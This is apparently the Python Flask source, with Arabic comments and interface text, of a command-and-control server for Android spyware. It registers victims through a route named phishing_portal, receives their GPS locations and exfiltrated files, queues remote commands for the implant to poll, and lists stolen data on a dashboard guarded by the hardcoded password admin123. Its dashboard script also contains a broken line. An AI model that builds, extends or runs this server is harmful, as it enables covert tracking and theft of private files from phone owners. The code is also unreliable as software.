from flask import Flask, render_template_string, request, jsonify, make_response, session, redirect, url_for
import base64
import urllib3
import datetime
import json
import hashlib

urllib3.disable_warnings()

app = Flask(__name__)
app.secret_key = hashlib.sha256(b"secure_secret_key_v78_real_engine").digest()

# كلمة المرور الخاصة بلوحة القيادة (admin123)
DASHBOARD_PASSWORD_HASH = hashlib.sha256("admin123".encode()).hexdigest()

# 🛡️ الذاكرة المركزية الميدانية للهدف (v78.5)
AGENT_SESSIONS = {}
COMMAND_QUEUE = {}
CAPTURED_CREDENTIALS = []
CAPTURED_SESSIONS = []
CAPTURED_LOCATIONS = []
CAPTURED_KEYSTROKES = []
EXTRACTED_FILES = []
EXTRACTED_ALL_FILES = []
SYSTEM_RECON_DATA = []
TELEMETRY_LOGS = []

def clean_url(raw):
    s = (raw or "").strip()
    if not s.startswith("http"):
        s = "http://" + s
    return s.rstrip("/")

# واجهة تسجيل الدخول
HTML_LOGIN_PAGE = """<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>تسجيل الدخول - مركز القيادة والسيطرة v78.5</title>
<style>
body{background:#010103;color:#ff0040;font-family:monospace;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}
.login-box{background:#04060e;border:2px solid #ff0040;padding:30px;border-radius:12px;box-shadow:0 0 45px rgba(255,0,64,0.6);width:90%;max-width:350px;text-align:center}
input{width:100%;padding:12px;margin:15px 0;background:#000;border:1px solid #ff0040;color:#fff;border-radius:6px;outline:none;text-align:center}
button{width:100%;padding:12px;background:#ff0040;border:none;color:#fff;font-weight:bold;border-radius:6px;cursor:pointer}
button:hover{background:#cc0033}
</style>
</head>
<body>
<div class="login-box">
  <h2>🔒 مركز القيادة v78.5</h2>
  <form method="POST" action="/commander/login">
    <input type="password" name="password" placeholder="أدخل كلمة المرور (admin123)" required>
    <button type="submit">دخول لوحة التحكم 🚀</button>
  </form>
</div>
</body>
</html>"""

# لوحة القيادة والسيطرة الشاملة
HTML_COMMAND_CENTER = """<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>القائد الأعظم - لوحة السيطرة الشاملة v78.5</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#010103;color:#00ff88;font-family:'Courier New',Consolas,monospace;padding:15px;text-align:center}
.container{max-width:1150px;margin:auto}
h1{color:#ff0040;margin-bottom:20px;text-shadow:0 0 35px #ff0040;font-size:24px}
.panel{background:#04060e;border:2px solid #ff0040;padding:20px;border-radius:12px;box-shadow:0 0 45px rgba(255,0,64,0.5)}
button{padding:14px 20px;background:#ff0040;border:none;border-radius:8px;font-weight:bold;color:#fff;cursor:pointer;font-size:15px;margin:5px}
button:hover{background:#cc0033}
.card{background:#000;border:1px solid #1a2a40;padding:15px;margin:15px auto;max-width:950px;border-radius:10px;text-align:right;border-right:8px solid #ff0040}
table{width:100%;margin-top:15px;border-collapse:collapse;color:#fff;text-align:right}
th, td{padding:10px;border:1px solid #1a2a40;font-size:13px}
th{background:#0a0e1a;color:#ff0040}
</style>
</head>
<body>
<div class="container">
<h1>⚔️ لوحة السيطرة المطلقة والتقارير v78.5 ⚔️</h1>
<div style="margin-bottom: 15px;"><a href="/commander/logout" style="color:#ff0040;text-decoration:none;font-weight:bold;">[تسجيل خروج آمن]</a></div>
<div class="panel">
  <h3>🎯 الأهداف المتصلة ووكلائنا النشطون:</h3>
  <div id="agents_list">جاري جلب البيانات...</div>
  
  <h3 style="margin-top:20px;">📂 الملفات المستخرجة من الهدف:</h3>
  <div id="files_list">جاري فحص الملفات...</div>
</div>
</div>

<script>
async function refreshData() {
    try {
        const res = await res = fetch('/api/get_all_data').then(r => r.json());
        // عرض الوكلاء
        let agentsHtml = '<table><tr><th>Token</th><th>النظام</th><th>IP</th><th>الوقت</th></tr>';
        if(res.agents && res.agents.length > 0) {
            res.agents.forEach(a => { agentsHtml += `<tr><td>${a.token}</td><td>${a.platform}</td><td>${a.ip}</td><td>${a.time}</td></tr>`; });
        } else { agentsHtml += '<tr><td colspan="4" style="text-align:center">لا توجد أهداف متصلة حالياً</td></tr>'; }
        agentsHtml += '</table>';
        document.getElementById('agents_list').innerHTML = agentsHtml;

        // عرض الملفات المستخرجة
        let filesHtml = '<table><tr><th>Token</th><th>اسم الملف</th><th>الوقت</th></tr>';
        if(res.files && res.files.length > 0) {
            res.files.forEach(f => { filesHtml += `<tr><td>${f.token}</td><td style="color:#00ff88">${f.filename}</td><td>${f.time}</td></tr>`; });
        } else { filesHtml += '<tr><td colspan="3" style="text-align:center">لم يتم استخراج ملفات حتى الآن</td></tr>'; }
        filesHtml += '</table>';
        document.getElementById('files_list').innerHTML = filesHtml;
    } catch(e) {}
}
setInterval(refreshData, 4000);
refreshData();
</script>
</body>
</html>"""

# مسار الصفحة الرئيسية (يوجه تلقائياً لتسجيل الدخول)
@app.route('/', methods=['GET'])
def home():
    return redirect(url_for('commander_login'))

@app.route('/commander/login', methods=['GET', 'POST'])
def commander_login():
    if request.method == 'POST':
        if hashlib.sha256(request.form.get('password', '').encode()).hexdigest() == DASHBOARD_PASSWORD_HASH:
            session['authenticated'] = True
            return redirect(url_for('commander_dashboard'))
    return HTML_LOGIN_PAGE

@app.route('/commander/dashboard', methods=['GET'])
def commander_dashboard():
    if not session.get('authenticated'):
        return redirect(url_for('commander_login'))
    return HTML_COMMAND_CENTER

@app.route('/commander/logout', methods=['GET'])
def commander_logout():
    session.pop('authenticated', None)
    return redirect(url_for('commander_login'))

# ----------------- مسارات استقبال الإشارات من تطبيق الأندرويد -----------------

@app.route('/auth/verify/login', methods=['POST'])
def phishing_portal():
    req_data = request.get_json(silent=True) or {}
    token = req_data.get('session_token', 'agent_target')
    agent_info = {
        "agent": f"{req_data.get('user_agent', 'Android Target')[:25]}",
        "token": token,
        "ip": request.headers.get('X-Forwarded-For', request.remote_addr),
        "platform": req_data.get('platform', 'Android Native'),
        "time": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    }
    AGENT_SESSIONS[token] = agent_info
    COMMAND_QUEUE[token] = ""
    return jsonify({"status": "agent_active", "token": token})

@app.route('/api/telemetry', methods=['POST'])
def api_telemetry():
    req_data = request.get_json(silent=True) or {}
    TELEMETRY_LOGS.append({
        "token": req_data.get('token', 'N/A'),
        "connection": req_data.get('connection', 'Active'),
        "platform": req_data.get('platform', 'Android App'),
        "time": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    })
    return jsonify({"status": "telemetry_secured"})

@app.route('/api/location', methods=['POST'])
def api_location():
    req_data = request.get_json(silent=True) or {}
    CAPTURED_LOCATIONS.append({
        "token": req_data.get('token', 'N/A'),
        "lat": req_data.get('lat', 'N/A'),
        "lon": req_data.get('lon', 'N/A'),
        "accuracy": req_data.get('accuracy', 'N/A'),
        "time": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    })
    return jsonify({"status": "location_secured"})

@app.route('/api/upload', methods=['POST'])
def api_upload():
    req_data = request.get_json(silent=True) or {}
    EXTRACTED_FILES.append({
        "token": req_data.get('token', 'N/A'),
        "filename": req_data.get('filename', 'snapshot.png'),
        "data": req_data.get('data', ''),
        "time": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    })
    return jsonify({"status": "file_secured"})

# 📂 مسار استقبال الملفات المستخرجة عبر وحدة الاستخراج الشامل
@app.route('/api/extract_files', methods=['POST'])
def api_extract_files():
    req_data = request.get_json(silent=True) or {}
    entry = {
        "token": req_data.get('token', 'N/A'),
        "filename": req_data.get('filename', 'target_file.bin'),
        "data": req_data.get('data', ''),
        "time": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    }
    EXTRACTED_ALL_FILES.append(entry)
    return jsonify({"status": "success", "message": "File extracted successfully"})

@app.route('/api/get_all_data', methods=['GET'])
def get_all_data():
    if not session.get('authenticated'):
        return jsonify({"error": "Unauthorized"}), 401
    return jsonify({
        "agents": list(AGENT_SESSIONS.values()),
        "files": EXTRACTED_ALL_FILES,
        "locations": CAPTURED_LOCATIONS
    })

@app.route('/api/poll', methods=['GET'])
def poll_commands():
    token = request.args.get('token', '')
    cmd = COMMAND_QUEUE.get(token, "")
    if token in COMMAND_QUEUE:
        COMMAND_QUEUE[token] = ""
    return jsonify({"command": cmd})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)
